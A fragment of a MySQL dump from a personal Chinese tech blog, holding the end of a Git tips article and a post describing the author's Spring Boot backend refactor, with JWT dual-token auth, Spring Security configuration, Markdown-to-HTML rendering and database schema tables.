<li><code>commit-msg</code> – 校验提交信息格式</li>\n  <li><code>pre-push</code> – 推送前运行测试</li>\n</ul>\n<p>工具推荐：<code>husky</code>（跨平台）、<code>pre-commit</code> 框架。</p>\n<hr />\n<h2 id=\"19-最佳实践--注意事项\">19. 最佳实践 &amp; 注意事项</h2>\n<table>\n  <thead>\n    <tr><th>场景</th><th>推荐做法</th><th>避免</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>提交信息</td><td>类型(范围): 简述（如 <code>feat: add login</code>），体例一致</td><td>随意乱写</td></tr>\n    <tr><td>分支命名</td><td><code>feature/xxx</code>, <code>fix/xxx</code>, <code>hotfix/xxx</code>, <code>chore/xxx</code></td><td>无意义名称</td></tr>\n    <tr><td>合并策略</td><td>公共分支用 merge --no-ff；私有分支可用 rebase</td><td>线性历史强制改写</td></tr>\n    <tr><td>同步远程</td><td>提交前先 pull --rebase</td><td>push 后再 pull 产生 merge 节点</td></tr>\n    <tr><td>强制推送</td><td>只用 <code>--force-with-lease</code></td><td>直接 <code>--force</code></td></tr>\n    <tr><td>大文件</td><td>使用 Git LFS</td><td>直接提交二进制大文件</td></tr>\n    <tr><td>敏感信息</td><td>环境变量 / 密码本</td><td>直接把密钥提交到仓库</td></tr>\n  </tbody>\n</table>\n<hr />\n<h2 id=\"20-一条命令拯救你\">20. 一条命令拯救你</h2>\n<pre><code class=\"language-bash\"># 所有修改都弄乱了，只想回到最后一次提交的干净状态\ngit reset --hard HEAD\n\n# 提交错了，想改 message\ngit commit --amend\n\n# 刚刚 git pull 产生了乱七八糟的 merge 节点，想撤销\ngit reset --hard origin/main   # 强制与远程一致\n\n# 清理无效的远程跟踪分支\ngit remote prune origin\n</code></pre>\n<hr />\n<p><strong>结语</strong>：<br />\n以上覆盖了真实工作中 95% 的 Git 操作。遇到剩下 5% 的诡异问题，首选 <code>git reflog</code> 找回状态，再查文档。</p>\n', 'https://lilicould.cn:8888/uploads/3577bcdc-9dd5-4de9-a43b-609ecaa90275.jpeg', 1, 22, 2, '2026-05-06 11:58:51', '2026-05-19 09:49:20', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (76, '后端重构', 'back-refactor', '对后端进行了比较彻底的重构', '# 后端重构\n\n---\n\n> 由于之前这个项目只是拿来练手的，最开始也没有太多的想法，那时候技术水平也比较低，所以很多设计上有巨大的缺陷，虽然勉强可以用，但是体验和安全隐患可能存在较大的问题。于是最近花费了不少时间，对后端进行了一次比较彻底的重构。\n\n---\n\n## 技术栈\n\n### 之前的一些问题\n\n1. 之前前后端的技术栈很不明确，后端只存储Markdown格式的博客，需要前端请求到数据后还需要前端进行markdwon的转换和渲染都在前端处理，不仅数据库中content_html字段被忽略掉了，而且前端渲染也会比较慢。现在采取后端存储时自动转换为HTML，渲染时前端只需要读取HTML就好了。\n2. 之前的token每次登录一次签发，随后便不再处理，如果被XSS或其他攻击截获就很危险。现在采用双令牌机制，访问令牌短时效，刷新令牌长失效，安全性更高。同时刷新令牌使用http-only-cookie存储，被截获的可能性更低。\n3. 之前没有用到分页插件，各种查询和权限处理也全靠拦截器和SQL实现。实现起来较为复杂且不规范，不好维护。\n4. 之前的接口设计的也很乱，为了让未登录用户能访问文章，竟然给文章单独开了一个public分裂。\n5. 之前文件存储是直接基于后端的，也就是说会直接存储到服务器，导致之前迁移的时候也有点问题，而且这对分布式来说是很大的问题，职责不清晰。\n\n### 新的技术栈\n\n|        技术栈        |                  简述                  | 是否启用 |\n| :------------------: | :-------------------------------------: | :------: |\n|  Spring Boot 4.0.6  |       核心框架，提供快速开发能力       |    ✅    |\n| MyBatis-Plus 3.5.15 |        ORM 框架，简化数据库操作        |    ✅    |\n|        MySQL        |       关系型数据库，存储业务数据       |    ✅    |\n|        Redis        |        缓存数据库，提升查询性能        |    ✅    |\n|   Spring Security   |       安全框架，提供认证授权功能       |    ✅    |\n|        OAuth2        |   和security一起的，暂时只做简单实现   |    ❌    |\n|  JWT (jjwt 0.13.0)  |     JSON Web Token，实现无状态认证     |    ✅    |\n|   NextDoc4j 1.3.1   |    API 文档生成工具（替代 Swagger）    |    ✅    |\n| flexmark-java 0.64.8 | Markdown 解析器，将 Markdown 转为 HTML |    ✅    |\n|      七牛云 SDK      |       对象存储服务，用于文件上传       |    ✅    |\n|  Jakarta Validation  |       参数校验框架，提供数据验证       |    ✅    |\n|        Lombok        | 代码简化工具，自动生成 getter/setter 等 |    ✅    |\n|   Spring Actuator   |           应用监控和健康检查           |    ✅    |\n\n### 说明\n\n- 项目使用 **Spring Boot 4.0.6**（最新版本），基于 Java 17\n- 使用 **MyBatis-Plus Spring Boot 4 Starter**，专门适配 Spring Boot 4\n- API 文档使用 **NextDoc4j** 而非传统的 Swagger/OpenAPI\n- Markdown 内容通过 **flexmark-java** 解析为 HTML 存储和展示\n- 文件存储使用 **七牛云对象存储**\n- 认证采用 **JWT + Spring Security过滤器** 组合方案\n\n---\n\n## 实现的功能\n\n### 1. 双令牌认证机制\n\n采用 **双令牌机制** 实现安全的用户认证：\n\n| 令牌类型     | 存储位置             | 有效期 | 用途                 |\n| ------------ | -------------------- | ------ | -------------------- |\n| AccessToken  | 请求头 Authorization | 30分钟 | 访问受保护资源的凭证 |\n| RefreshToken | HttpOnly Cookie      | 7天    | 刷新 AccessToken     |\n\n**实现要点**：\n\n- `TokenService` 负责令牌的生成与存储\n- 刷新令牌通过 `ResponseCookie` 设置为 http-only、secure、sameSite=None\n- 刷新令牌存储于 Redis，键名前缀为 `auth:refreshToken:`\n- `JwtAuthFilter` 拦截请求，验证 AccessToken 并设置 Security 上下文\n- 登录频率限制：同一账号 5 秒内禁止重复登录\n\n### 2. 登录策略模式\n\n采用 **策略模式** 支持多种登录方式，便于扩展：\n\n```\nLoginStrategyFactory\n    ├── PwdLoginStrategy     (用户名密码登录)\n    └── EmailLoginStrategy   (邮箱登录)\n```\n\n- `LoginStrategy` 接口定义统一的登录方法\n- 工厂类 `LoginStrategyFactory` 根据请求参数动态选择策略\n- 新增登录方式只需实现接口，无需修改原有代码\n\n### 3. 统一异常处理\n\n`GlobalExceptionHandler` 提供全集中的异常处理：\n\n| 异常类型                        | 处理方式                         |\n| ------------------------------- | -------------------------------- |\n| BusinessException               | 业务自定义异常，返回业务错误码   |\n| MethodArgumentNotValidException | 参数校验失败，返回第一个错误信息 |\n| AuthorizationDeniedException    | 权限不足，返回无权限错误         |\n| SQLException                    | 数据库操作异常                   |\n| NoResourceFoundException        | 资源不存在                       |\n| Exception (兜底)                | 系统异常，返回通用错误           |\n\n### 4. MyBatis-Plus 分页\n\n引入分页插件，简化分页查询：\n\n```java\n// 配置类\nMybatisPlusInterceptor\n    └── PaginationInnerInterceptor (MySQL)\n        ├── maxLimit: 50    // 单页最大50条\n        └── overflow: true  // 超出总页数自动处理\n```\n\n**查询对象设计**：\n\n```\nBaseQuery (抽象基类)\n    ├── current  // 当前页码\n    └── size    // 每页数量\n\nArticleQuery (继承)\n    ├── title      // 标题模糊查询\n    ├── categoryId // 分类筛选\n    ├── status     // 状态筛选\n    ├── startTime  // 发布时间范围\n    └── endTime\n```\n\n### 5. Markdown 转 HTML\n\n使用 flexmark-java 在后端完成 Markdown 到 HTML 的转换：\n\n**支持的扩展**：\n\n- 表格扩展 (TablesExtension)\n- 删除线 (StrikethroughExtension)\n- 自动链接 (AutolinkExtension)\n- 任务列表 (TaskListExtension)\n- 目录生成 (TocExtension)\n\n**安全措施**：\n\n- `HtmlRenderer.SUPPRESS_HTML = true`：禁止解析内嵌 HTML，防止 XSS\n- `PercentEncodeUrls = true`：URL 特殊字符编码\n\n### 6. Redis 缓存封装\n\n`RedisHelper` 对 RedisTemplate 进行封装，提供简洁 API：\n\n| 操作类型 | 方法示例                    |\n| -------- | --------------------------- |\n| String   | set / get / setIfAbsent     |\n| Hash     | hSet / hGet / hGetAll       |\n| List     | lLeftPush / lRightPush      |\n| Set      | sAdd / sMembers / sIsMember |\n\n- 自动添加应用名前缀 (`liliblog:`) 避免键名冲突\n- 支持 Duration 方式设置过期时间\n\n### 7. Spring Security 配置\n\n`SecurityConfig` 统一配置安全策略：\n\n**认证规则**：\n\n- 公开访问：`/auth/**`、`/api/article/GET`、`/api/category/GET`、`/doc.html`、`/nextdoc/**`\n- 受保护资源：其他所有请求需要认证\n\n**CORS 配置**：\n\n- 允许所有来源 (生产环境建议改为具体域名)\n- 支持 GET/POST/PUT/DELETE/OPTIONS\n- 允许携带凭证\n\n**会话管理**：\n\n- 禁用 CSRF（前后端分离项目）\n- 无状态会话（JWT 认证场景）\n\n### 8. 文件存储\n\n集成七牛云对象存储，文件上传与服务器解耦：\n\n- `OssUtil` 封装七牛云 SDK\n- `OssProperties` 集中管理配置\n- 支持图片、附件等多种文件类型\n- CDN 加速访问\n\n### 9. API 文档\n\n使用 NextDoc4j 生成 API 文档，替代传统 Swagger：\n\n- 访问地址：`/doc.html`\n- 支持 OpenAPI 3.0 规范\n- 自动扫描 Controller 和 DTO 生成文档\n- 全局异常处理器标记 `@Hidden`，不显示在文档中\n\n---\n\n## 项目结构\n\n```\nsrc/main/java/cn/lilicould/liliblog/\n├── config/\n│   ├── mybatis/          # MyBatis-Plus 配置\n│   ├── properties/       # 配置属性类\n│   ├── security/         # Security 配置及处理器\n│   └── RedisConfig.java  # Redis 配置\n├── controller/           # 控制器层\n├── service/              # 服务层接口\n│   └── impl/             # 服务层实现\n├── mapper/               # MyBatis Mapper 接口\n├── model/\n│   ├── entity/           # 实体类\n│   │   └── base/         # 基类 (FullBaseEntity, CreateOnlyEntity)\n│   ├── dto/\n│   │   ├── request/      # 请求 DTO\n│   │   ├── response/     # 响应 DTO\n│   │   └── query/        # 查询 DTO\n│   └── domain/\n│       └── security/     # Security 相关类\n├── common/\n│   ├── cache/            # Redis 缓存工具\n│   ├── constant/         # 常量定义\n│   ├── enums/            # 枚举类\n│   ├── exception/        # 异常类\n│   ├── result/           # 统一响应结构\n│   └── util/             # 工具类\n├── strategy/             # 登录策略模式\n│   └── impl/             # 策略实现\n├── filter/               # 过滤器 (JwtAuthFilter, WebLogFilter)\n└── task/                 # 定时任务\n\n```\n\n---\n\n## 目前进度\n\n目前已经开发完了基本的后端接口，包括用户认证、文章管理、分类标签、评论功能、文件上传等核心模块。API 文档已配置完成，可以访问 `/doc.html` 查看。\n\n下一步计划：\n\n- [ ] 添加文章访问量统计\n- [ ] 优化查询性能，添加缓存策略\n- [ ] 完成 OAuth2 第三方登录\n- [ ] 编写单元测试\n\n---\n\n## 数据库设计\n\n### 用户表 (user)\n\n| 字段            | 类型         | 说明                 |\n| --------------- | ------------ | -------------------- |\n| id              | BIGINT       | 主键，自增           |\n| username        | VARCHAR(50)  | 用户名，唯一         |\n| nickname        | VARCHAR(50)  | 昵称                 |\n| email           | VARCHAR(100) | 邮箱，唯一           |\n| password        | VARCHAR(255) | 密码（BCrypt加密）   |\n| avatar          | VARCHAR(255) | 头像URL              |\n| role            | TINYINT      | 角色：0-普通用户     |\n| status          | TINYINT      | 状态：0-禁用，1-正常 |\n| last_login_time | DATETIME     | 最后登录时间         |\n\n### 文章表 (article)\n\n| 字段         | 类型         | 说明                         |\n| ------------ | ------------ | ---------------------------- |\n| id           | BIGINT       | 主键，自增                   |\n| title        | VARCHAR(100) | 文章标题                     |\n| slug         | VARCHAR(100) | URL别名，唯一                |\n| summary      | TEXT         | 文章摘要                     |\n| content      | TEXT         | Markdown内容                 |\n| content_html | TEXT         | HTML内容                     |\n| cover_image  | VARCHAR(255) | 封面图片                     |\n| status       | TINYINT      | 状态：0-审核，1-发布，2-草稿 |\n| view_count   | INT          | 阅读数                       |\n| category_id  | BIGINT       | 分类ID                       |\n\n### 评论表 (comment)\n\n| 字段      | 类型    | 说明                 |\n| --------- | ------- | -------------------- |\n| id        | BIGINT  | 主键，自增           |\n| content   | TEXT    | 评论内容             |\n| type      | TINYINT | 类型：0-文章，1-评论 |\n| user_id   | BIGINT  | 评论用户ID           |\n| target_id | BIGINT  | 目标ID（文章/评论）  |\n| parent_id | BIGINT  | 父评论ID，支持嵌套   |\n\n---\n', '<h1 id=\"后端重构\">后端重构</h1>\n<hr />\n<blockquote>\n  <p>由于之前这个项目只是拿来练手的，最开始也没有太多的想法，那时候技术水平也比较低，所以很多设计上有巨大的缺陷，虽然勉强可以用，但是体验和安全隐患可能存在较大的问题。于是最近花费了不少时间，对后端进行了一次比较彻底的重构。</p>\n</blockquote>\n<hr />\n<h2 id=\"技术栈\">技术栈</h2>\n<h3 id=\"之前的一些问题\">之前的一些问题</h3>\n<ol>\n  <li>之前前后端的技术栈很不明确，后端只存储Markdown格式的博客，需要前端请求到数据后还需要前端进行markdwon的转换和渲染都在前端处理，不仅数据库中content_html字段被忽略掉了，而且前端渲染也会比较慢。现在采取后端存储时自动转换为HTML，渲染时前端只需要读取HTML就好了。</li>\n  <li>之前的token每次登录一次签发，随后便不再处理，如果被XSS或其他攻击截获就很危险。现在采用双令牌机制，访问令牌短时效，刷新令牌长失效，安全性更高。同时刷新令牌使用http-only-cookie存储，被截获的可能性更低。</li>\n  <li>之前没有用到分页插件，各种查询和权限处理也全靠拦截器和SQL实现。实现起来较为复杂且不规范，不好维护。</li>\n  <li>之前的接口设计的也很乱，为了让未登录用户能访问文章，竟然给文章单独开了一个public分裂。</li>\n  <li>之前文件存储是直接基于后端的，也就是说会直接存储到服务器，导致之前迁移的时候也有点问题，而且这对分布式来说是很大的问题，职责不清晰。</li>\n</ol>\n<h3 id=\"新的技术栈\">新的技术栈</h3>\n<table>\n  <thead>\n    <tr><th align=\"center\">技术栈</th><th align=\"center\">简述</th><th align=\"center\">是否启用</th></tr>\n  </thead>\n  <tbody>\n    <tr><td align=\"center\">Spring Boot 4.0.6</td><td align=\"center\">核心框架，提供快速开发能力</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">MyBatis-Plus 3.5.15</td><td align=\"center\">ORM 框架，简化数据库操作</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">MySQL</td><td align=\"center\">关系型数据库，存储业务数据</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">Redis</td><td align=\"center\">缓存数据库，提升查询性能</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">Spring Security</td><td align=\"center\">安全框架，提供认证授权功能</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">OAuth2</td><td align=\"center\">和security一起的，暂时只做简单实现</td><td align=\"center\">❌</td></tr>\n    <tr><td align=\"center\">JWT (jjwt 0.13.0)</td><td align=\"center\">JSON Web Token，实现无状态认证</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">NextDoc4j 1.3.1</td><td align=\"center\">API 文档生成工具（替代 Swagger）</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">flexmark-java 0.64.8</td><td align=\"center\">Markdown 解析器，将 Markdown 转为 HTML</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">七牛云 SDK</td><td align=\"center\">对象存储服务，用于文件上传</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">Jakarta Validation</td><td align=\"center\">参数校验框架，提供数据验证</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">Lombok</td><td align=\"center\">代码简化工具，自动生成 getter/setter 等</td><td align=\"center\">✅</td></tr>\n    <tr><td align=\"center\">Spring Actuator</td><td align=\"center\">应用监控和健康检查</td><td align=\"center\">✅</td></tr>\n  </tbody>\n</table>\n<h3 id=\"说明\">说明</h3>\n<ul>\n  <li>项目使用 <strong>Spring Boot 4.0.6</strong>（最新版本），基于 Java 17</li>\n  <li>使用 <strong>MyBatis-Plus Spring Boot 4 Starter</strong>，专门适配 Spring Boot 4</li>\n  <li>API 文档使用 <strong>NextDoc4j</strong> 而非传统的 Swagger/OpenAPI</li>\n  <li>Markdown 内容通过 <strong>flexmark-java</strong> 解析为 HTML 存储和展示</li>\n  <li>文件存储使用 <strong>七牛云对象存储</strong></li>\n  <li>认证采用 <strong>JWT + Spring Security过滤器</strong> 组合方案</li>\n</ul>\n<hr />\n<h2 id=\"实现的功能\">实现的功能</h2>\n<h3 id=\"1-双令牌认证机制\">1. 双令牌认证机制</h3>\n<p>采用 <strong>双令牌机制</strong> 实现安全的用户认证：</p>\n<table>\n  <thead>\n    <tr><th>令牌类型</th><th>存储位置</th><th>有效期</th><th>用途</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>AccessToken</td><td>请求头 Authorization</td><td>30分钟</td><td>访问受保护资源的凭证</td></tr>\n    <tr><td>RefreshToken</td><td>HttpOnly Cookie</td><td>7天</td><td>刷新 AccessToken</td></tr>\n  </tbody>\n</table>\n<p><strong>实现要点</strong>：</p>\n<ul>\n  <li><code>TokenService</code> 负责令牌的生成与存储</li>\n  <li>刷新令牌通过 <code>ResponseCookie</code> 设置为 http-only、secure、sameSite=None</li>\n  <li>刷新令牌存储于 Redis，键名前缀为 <code>auth:refreshToken:</code></li>\n  <li><code>JwtAuthFilter</code> 拦截请求，验证 AccessToken 并设置 Security 上下文</li>\n  <li>登录频率限制：同一账号 5 秒内禁止重复登录</li>\n</ul>\n<h3 id=\"2-登录策略模式\">2. 登录策略模式</h3>\n<p>采用 <strong>策略模式</strong> 支持多种登录方式，便于扩展：</p>\n<pre><code>LoginStrategyFactory\n    ├── PwdLoginStrategy     (用户名密码登录)\n    └── EmailLoginStrategy   (邮箱登录)\n</code></pre>\n<ul>\n  <li><code>LoginStrategy</code> 接口定义统一的登录方法</li>\n  <li>工厂类 <code>LoginStrategyFactory</code> 根据请求参数动态选择策略</li>\n  <li>新增登录方式只需实现接口，无需修改原有代码</li>\n</ul>\n<h3 id=\"3-统一异常处理\">3. 统一异常处理</h3>\n<p><code>GlobalExceptionHandler</code> 提供全集中的异常处理：</p>\n<table>\n  <thead>\n    <tr><th>异常类型</th><th>处理方式</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>BusinessException</td><td>业务自定义异常，返回业务错误码</td></tr>\n    <tr><td>MethodArgumentNotValidException</td><td>参数校验失败，返回第一个错误信息</td></tr>\n    <tr><td>AuthorizationDeniedException</td><td>权限不足，返回无权限错误</td></tr>\n    <tr><td>SQLException</td><td>数据库操作异常</td></tr>\n    <tr><td>NoResourceFoundException</td><td>资源不存在</td></tr>\n    <tr><td>Exception (兜底)</td><td>系统异常，返回通用错误</td></tr>\n  </tbody>\n</table>\n<h3 id=\"4-mybatis-plus-分页\">4. MyBatis-Plus 分页</h3>\n<p>引入分页插件，简化分页查询：</p>\n<pre><code class=\"language-java\">// 配置类\nMybatisPlusInterceptor\n    └── PaginationInnerInterceptor (MySQL)\n        ├── maxLimit: 50    // 单页最大50条\n        └── overflow: true  // 超出总页数自动处理\n</code></pre>\n<p><strong>查询对象设计</strong>：</p>\n<pre><code>BaseQuery (抽象基类)\n    ├── current  // 当前页码\n    └── size    // 每页数量\n\nArticleQuery (继承)\n    ├── title      // 标题模糊查询\n    ├── categoryId // 分类筛选\n    ├── status     // 状态筛选\n    ├── startTime  // 发布时间范围\n    └── endTime\n</code></pre>\n<h3 id=\"5-markdown-转-html\">5. Markdown 转 HTML</h3>\n<p>使用 flexmark-java 在后端完成 Markdown 到 HTML 的转换：</p>\n<p><strong>支持的扩展</strong>：</p>\n<ul>\n  <li>表格扩展 (TablesExtension)</li>\n  <li>删除线 (StrikethroughExtension)</li>\n  <li>自动链接 (AutolinkExtension)</li>\n  <li>任务列表 (TaskListExtension)</li>\n  <li>目录生成 (TocExtension)</li>\n</ul>\n<p><strong>安全措施</strong>：</p>\n<ul>\n  <li><code>HtmlRenderer.SUPPRESS_HTML = true</code>：禁止解析内嵌 HTML，防止 XSS</li>\n  <li><code>PercentEncodeUrls = true</code>：URL 特殊字符编码</li>\n</ul>\n<h3 id=\"6-redis-缓存封装\">6. Redis 缓存封装</h3>\n<p><code>RedisHelper</code> 对 RedisTemplate 进行封装，提供简洁 API：</p>\n<table>\n  <thead>\n    <tr><th>操作类型</th><th>方法示例</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>String</td><td>set / get / setIfAbsent</td></tr>\n    <tr><td>Hash</td><td>hSet / hGet / hGetAll</td></tr>\n    <tr><td>List</td><td>lLeftPush / lRightPush</td></tr>\n    <tr><td>Set</td><td>sAdd / sMembers / sIsMember</td></tr>\n  </tbody>\n</table>\n<ul>\n  <li>自动添加应用名前缀 (<code>liliblog:</code>) 避免键名冲突</li>\n  <li>支持 Duration 方式设置过期时间</li>\n</ul>\n<h3 id=\"7-spring-security-配置\">7. Spring Security 配置</h3>\n<p><code>SecurityConfig</code> 统一配置安全策略：</p>\n<p><strong>认证规则</strong>：</p>\n<ul>\n  <li>公开访问：<code>/auth/**</code>、<code>/api/article/GET</code>、<code>/api/category/GET</code>、<code>/doc.html</code>、<code>/nextdoc/**</code></li>\n  <li>受保护资源：其他所有请求需要认证</li>\n</ul>\n<p><strong>CORS 配置</strong>：</p>\n<ul>\n  <li>允许所有来源 (生产环境建议改为具体域名)</li>\n  <li>支持 GET/POST/PUT/DELETE/OPTIONS</li>\n  <li>允许携带凭证</li>\n</ul>\n<p><strong>会话管理</strong>：</p>\n<ul>\n  <li>禁用 CSRF（前后端分离项目）</li>\n  <li>无状态会话（JWT 认证场景）</li>\n</ul>\n<h3 id=\"8-文件存储\">8. 文件存储</h3>\n<p>集成七牛云对象存储，文件上传与服务器解耦：</p>\n<ul>\n  <li><code>OssUtil</code> 封装七牛云 SDK</li>\n  <li><code>OssProperties</code> 集中管理配置</li>\n  <li>支持图片、附件等多种文件类型</li>\n  <li>CDN 加速访问</li>\n</ul>\n<h3 id=\"9-api-文档\">9. API 文档</h3>\n<p>使用 NextDoc4j 生成 API 文档，替代传统 Swagger：</p>\n<ul>\n  <li>访问地址：<code>/doc.html</code></li>\n  <li>支持 OpenAPI 3.0 规范</li>\n  <li>自动扫描 Controller 和 DTO 生成文档</li>\n  <li>全局异常处理器标记 <code>@Hidden</code>，不显示在文档中</li>\n</ul>\n<hr />\n<h2 id=\"项目结构\">项目结构</h2>\n<pre><code>src/main/java/cn/lilicould/liliblog/\n├── config/\n│   ├── mybatis/          # MyBatis-Plus 配置\n│   ├── properties/       # 配置属性类\n│   ├── security/         # Security 配置及处理器\n│   └── RedisConfig.java  # Redis 配置\n├── controller/           # 控制器层\n├── service/              # 服务层接口\n│   └── impl/             # 服务层实现\n├── mapper/               # MyBatis Mapper 接口\n├── model/\n│   ├── entity/           # 实体类\n│   │   └── base/         # 基类 (FullBaseEntity, CreateOnlyEntity)\n│   ├── dto/\n│   │   ├── request/      # 请求 DTO\n│   │   ├── response/     # 响应 DTO\n│   │   └── query/        # 查询 DTO\n│   └── domain/\n│       └── security/     # Security 相关类\n├── common/\n│   ├── cache/            # Redis 缓存工具\n│   ├── constant/         # 常量定义\n│   ├── enums/            # 枚举类\n│   ├── exception/        # 异常类\n│   ├── result/           # 统一响应结构\n│   └── util/             # 工具类\n├── strategy/             # 登录策略模式\n│   └── impl/             # 策略实现\n├── filter/               # 过滤器 (JwtAuthFilter, WebLogFilter)\n└── task/                 # 定时任务\n\n</code></pre>\n<hr />\n<h2 id=\"目前进度\">目前进度</h2>\n<p>目前已经开发完了基本的后端接口，包括用户认证、文章管理、分类标签、评论功能、文件上传等核心模块。API 文档已配置完成，可以访问 <code>/doc.html</code> 查看。</p>\n<p>下一步计划：</p>\n<ul>\n  <li class=\"task-list-item\"><input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled=\"disabled\" readonly=\"readonly\" />&nbsp;添加文章访问量统计</li>\n  <li class=\"task-list-item\"><input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled=\"disabled\" readonly=\"readonly\" />&nbsp;优化查询性能，添加缓存策略</li>\n  <li class=\"task-list-item\"><input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled=\"disabled\" readonly=\"readonly\" />&nbsp;完成 OAuth2 第三方登录</li>\n  <li class=\"task-list-item\"><input type=\"checkbox\" class=\"task-list-item-checkbox\" disabled=\"disabled\" readonly=\"readonly\" />&nbsp;编写单元测试</li>\n</ul>\n<hr />\n<h2 id=\"数据库设计\">数据库设计</h2>\n<h3 id=\"用户表-user\">用户表 (user)</h3>\n<table>\n  <thead>\n    <tr><th>字段</th><th>类型</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>id</td><td>BIGINT</td><td>主键，自增</td></tr>\n    <tr><td>username</td><td>VARCHAR(50)</td><td>用户名，唯一</td></tr>\n    <tr><td>nickname</td><td>VARCHAR(50)</td><td>昵称</td></tr>\n    <tr><td>email</td><td>VARCHAR(100)</td><td>邮箱，唯一</td></tr>\n    <tr><td>password</td><td>VARCHAR(255)</td><td>密码（BCrypt加密）</td></tr>\n    <tr><td>avatar</td><td>VARCHAR(255)</td><td>头像URL</td></tr>\n    <tr><td>role</td><td>TINYINT</td><td>角色：0-普通用户</td></tr>\n    <tr><td>status</td><td>TINYINT</td><td>状态：0-禁用，1-正常</td></tr>\n    <tr><td>last_login_time</td><td>DATETIME</td><td>最后登录时间</td></tr>\n  </tbody>\n</table>\n<h3 id=\"文章表-article\">文章表 (article)</h3>\n<table>\n  <thead>\n    <tr><th>字段</th><th>类型</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>id</td><td>BIGINT</td><td>主键，自增</td></tr>\n    <tr><td>title</td><td>VARCHAR(100)</td><td>文章标题</td></tr>\n    <tr><td>slug</td><td>VARCHAR(100)</td><td>URL别名，唯一</td></tr>\n    <tr><td>summary</td><td>TEXT</td><td>文章摘要</td></tr>\n    <tr><td>content</td><td>TEXT</td><td>Markdown内容</td></tr>\n    <tr><td>content_html</td><td>TEXT</td><td>HTML内容</td></tr>\n    <tr><td>cover_image</td><td>VARCHAR(255)</td><td>封面图片</td></tr>\n    <tr><td>status</td><td>TINYINT</td><td>状态：0-审核，1-发布，2-草稿</td></tr>\n    <tr><td>view_count</td><td>INT</td><td>阅读数</td></tr>\n    <tr><td>category_id</td><td>BIGINT</td><td>分类ID</td></tr>\n  </tbody>\n</table>\n<h3 id=\"评论表-comment\">评论表 (comment)</h3>\n<table>\n  <thead>\n    <tr><th>字段</th><th>类型</th><th>说明</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>id</td><td>BIGINT</td><td>主键，自增</td></tr>\n    <tr><td>content</td><td>TEXT</td><td>评论内容</td></tr>\n    <tr><td>type</td><td>TINYINT</td><td>类型：0-文章，1-评论</td></tr>\n    <tr><td>user_id</td><td>BIGINT</td><td>评论用户ID</td></tr>\n    <tr><td>target_id</td><td>BIGINT</td><td>目标ID（文章/评论）</td></tr>\n    <tr><td>parent_id</td><td>BIGINT</td><td>父评论ID，支持嵌套</td></tr>\n  </tbody>\n</table>\n<hr />\n', 'https://oss.lilicould.cn/cover/7025dda1-0e5b-4c63-ae64-ea8943e142b5_hero-4.jpg', 1, 1, 1, '2026-05-18 15:33:12', '2026-05-19 10:21:18', 2, 2, 0);
